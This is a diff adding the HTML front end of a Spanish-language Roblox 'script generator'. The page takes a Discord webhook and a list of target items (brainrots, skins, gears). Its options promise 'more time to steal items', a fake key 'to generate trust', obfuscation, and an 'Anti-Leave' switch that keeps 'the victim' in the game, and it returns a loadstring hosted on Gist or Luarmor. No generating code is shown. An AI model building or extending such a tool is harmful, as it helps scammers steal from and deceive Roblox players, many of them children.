@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#0ea5e9">
+    <title>NovaDynamics Moreira — Script Generator</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="particles"></div>
+    
+    <div class="container">
+        <!-- Top Bar -->
+        <div class="top-bar">
+            <div class="lang-selector">
+                <button class="lang-btn active" data-lang="es">ES</button>
+                <button class="lang-btn" data-lang="en">EN</button>
+                <button class="lang-btn" data-lang="pt">PT</button>
+            </div>
+            <div class="user-status">
+                <span class="user-avatar">👤</span>
+                <span class="verified-badge">✅ Verified</span>
+            </div>
+        </div>
+
+        <!-- Hero Badges -->
+        <div class="badges-container">
+            <span class="feature-badge">⚡ Generación instantánea</span>
+            <span class="feature-badge">🔒 Webhook seguro</span>
+            <span class="feature-badge">🎯 3 categorías de targets</span>
+            <span class="feature-badge">🛡️ Ofuscación profesional</span>
+            <span class="feature-badge">📋 Gist/Luarmor Loader</span>
+            <span class="feature-badge">🤖 Anti-Bot</span>
+            <span class="feature-badge">🔑 FAKE KEY</span>
+            <span class="feature-badge">✨ Nuevos Brainrots & Gears</span>
+            <span class="feature-badge">🚫 Anti-Leave</span>
+        </div>
+
+        <!-- Configuración -->
+        <section class="config-section">
+            <h2 class="section-title">✨ Configuración</h2>
+
+            <!-- Roblox Username -->
+            <div class="input-group">
+                <label for="robloxUser">🎮 NOMBRE DE USUARIO DE ROBLOX</label>
+                <input type="text" id="robloxUser" class="text-input" placeholder="Buscar usuario de Roblox...">
+                <div class="user-card hidden" id="userCard">
+                    <div class="user-avatar-large" id="userAvatar">👤</div>
+                    <div class="user-info">
+                        <div class="user-name" id="userName">Usuario</div>
+                        <div class="user-id" id="userId">ID: —</div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Webhook -->
+            <div class="input-group">
+                <label for="webhook">📡 WEBHOOK</label>
+                <input type="text" id="webhook" class="text-input" placeholder="Ej: https://discord.com/api/webhooks/...">
+            </div>
+
+            <!-- Script Mode -->
+            <div class="input-group">
+                <label>🎨 MODO DE SCRIPT</label>
+                <div class="mode-grid">
+                    <label class="mode-card selected" data-mode="nogui">
+                        <input type="radio" name="scriptMode" value="nogui" checked>
+                        <span class="mode-icon">⚙️</span>
+                        <span class="mode-title">NO-GUI</span>
+                        <span class="mode-desc">Sin interfaz gráfica</span>
+                    </label>
+                    <label class="mode-card" data-mode="freeze">
+                        <input type="radio" name="scriptMode" value="freeze">
+                        <span class="mode-icon">❄️</span>
+                        <span class="mode-title">UI Fake Freeze Trade</span>
+                        <span class="mode-desc">Más tiempo para robar items</span>
+                    </label>
+                    <label class="mode-card" data-mode="insta">
+                        <input type="radio" name="scriptMode" value="insta">
+                        <span class="mode-icon">⚡</span>
+                        <span class="mode-title">FAKE INSTA STEAL</span>
+                        <span class="mode-desc">Script visual</span>
+                    </label>
+                    <label class="mode-card" data-mode="duels">
+                        <input type="radio" name="scriptMode" value="duels">
+                        <span class="mode-icon">⚔️</span>
+                        <span class="mode-title">DUELS — Vampire Hub</span>
+                        <span class="mode-desc">Script de duelos</span>
+                    </label>
+                    <label class="mode-card" data-mode="custom">
+                        <input type="radio" name="scriptMode" value="custom">
+                        <span class="mode-icon">✏️</span>
+                        <span class="mode-title">CUSTOM</span>
+                        <span class="mode-desc">Loader personalizado</span>
+                    </label>
+                </div>
+            </div>
+
+            <!-- Brainrots -->
+            <div class="input-group">
+                <label>🧠 BRAINROTS <span class="counter" id="brainrotCounter">0/285</span></label>
+                <div class="tags-container" id="brainrotsContainer">
+                    <span class="tag" data-value="Strawberry Elephant">🍓 Strawberry Elephant <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Meowl">🐱 Meowl <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Skibidi Toilet">🚽 Skibidi Toilet <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="John Pork">📞 John Pork <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Headless Horseman">🐴 Headless Horseman <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Draculino" class="selected">🧛 Draculino <span class="tag-close">×</span></span>
+                    <button class="add-btn" id="addBrainrot">+154 más</button>
+                </div>
+                <div class="selected-count">160 seleccionado</div>
+            </div>
+
+            <!-- Base Skins -->
+            <div class="input-group">
+                <label>🎨 BASE SKINS <span class="counter" id="skinCounter">0/25</span></label>
+                <div class="tags-container" id="skinsContainer">
+                    <span class="tag" data-value="Aquatic">🌊 Aquatic <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Bunny Basket">🐇 Bunny Basket <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Candy">🍬 Candy <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Christmas">🎄 Christmas <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Cursed">💀 Cursed <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Cyber">🤖 Cyber <span class="tag-close">×</span></span>
+                    <button class="add-btn">+19 más</button>
+                </div>
+                <div class="selected-count">25 seleccionado</div>
+            </div>
+
+            <!-- Gears -->
+            <div class="input-group">
+                <label>⚙️ GEARS <span class="counter" id="gearCounter">0/24</span></label>
+                <div class="tags-container" id="gearsContainer">
+                    <span class="tag" data-value="Alien Slap">👽 Alien Slap <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Blackhole Bomb">🕳️ Blackhole Bomb <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Bloodmoon Hammer">🔨 Bloodmoon Hammer <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Bloodmoon Slap">✋ Bloodmoon Slap <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Candy Sentry">🍭 Candy Sentry <span class="tag-close">×</span></span>
+                    <span class="tag" data-value="Candy Slap">✋ Candy Slap <span class="tag-close">×</span></span>
+                    <button class="add-btn">+18 más</button>
+                </div>
+                <div class="selected-count">24 seleccionado</div>
+            </div>
+
+            <!-- Toggle Options -->
+            <div class="toggle-section">
+                <div class="toggle-row">
+                    <span class="toggle-label">📋 Gist Loader</span>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="gistLoader">
+                        <span class="toggle-slider"></span>
+                    </label>
+                </div>
+                <p class="toggle-desc">Sube el script a GitHub Gist y devuelve un loadstring seguro</p>
+
+                <div class="toggle-row">
+                    <span class="toggle-label">📋 Luarmor Loader</span>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="luarmorLoader">
+                        <span class="toggle-slider"></span>
+                    </label>
+                </div>
+                <p class="toggle-desc">Sube a Luarmor y devuelve un loadstring seguro</p>
+
+                <div class="toggle-row">
+                    <span class="toggle-label">🛡️ Ofuscación profesional</span>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="obfuscate">
+                        <span class="toggle-slider"></span>
+                    </label>
+                </div>
+                <p class="toggle-desc">Protege tu código haciéndolo difícil de leer</p>
+
+                <div class="toggle-row">
+                    <span class="toggle-label">🔑 FAKE KEY</span>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="fakeKey">
+                        <span class="toggle-slider"></span>
+                    </label>
+                </div>
+                <p class="toggle-desc">Añade una key falsa al inicio del script para generar confianza</p>
+
+                <div class="toggle-row">
+                    <span class="toggle-label">🚫 Anti-Leave</span>
+                    <label class="toggle-switch">
+                        <input type="checkbox" id="antiLeave">
+                        <span class="toggle-slider"></span>
+                    </label>
+                </div>
+                <p class="toggle-desc">Evita que la víctima salga del juego mientras se ejecuta</p>
+            </div>
+
+            <!-- Gist Name -->
+            <div class="input-group hidden" id="gistNameGroup">
+                <label for="gistName">📝 NOMBRE DE TU SCRIPT EN GIST</label>
+                <input type="text" id="gistName" class="text-input" placeholder="Ej: MiSuperScript">
+                <span class="hint-text">⚡ Activa Gist Loader para personalizar el nombre</span>
+            </div>
+
+            <!-- Generate Button -->
+            <button class="generate-btn" id="generateBtn">
+                ✨ GENERAR SCRIPT
+            </button>
+
+            <!-- Result -->
+            <div class="result-box hidden" id="resultBox">
+                <label>✅ TU SCRIPT ESTÁ LISTO</label>
+                <input type="text" id="resultOutput" readonly class="text-input result-input" placeholder="Loadstring aparecerá aquí...">
+                <div class="result-buttons">
+                    <button class="copy-btn" id="copyBtn">📋 Copiar al portapapeles</button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Creator Footer -->
+        <footer class="creator-footer">
+            <div class="creator-card">
+                <div class="creator-avatar">⚡</div>
+                <div class="creator-info">
+                    <h3>NovaDynamics Moreira <span class="creator-badge">⭐ CREATOR</span></h3>
+                    <p>Creado y mantenido por NovaDynamics Moreira — el generador de scripts definitivo para Roblox.</p>
+                    <div class="creator-links">
+                        <a href="#" class="discord-link">💬 @novadynamics</a>
+                        <a href="#" class="discord-btn">🔗 Unirse al servidor</a>
+                    </div>
+                </div>
+            </div>
+            <p class="copyright">© 2026 NovaDynamics Moreira. Todos los derechos reservados.</p>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+  </html>
+  
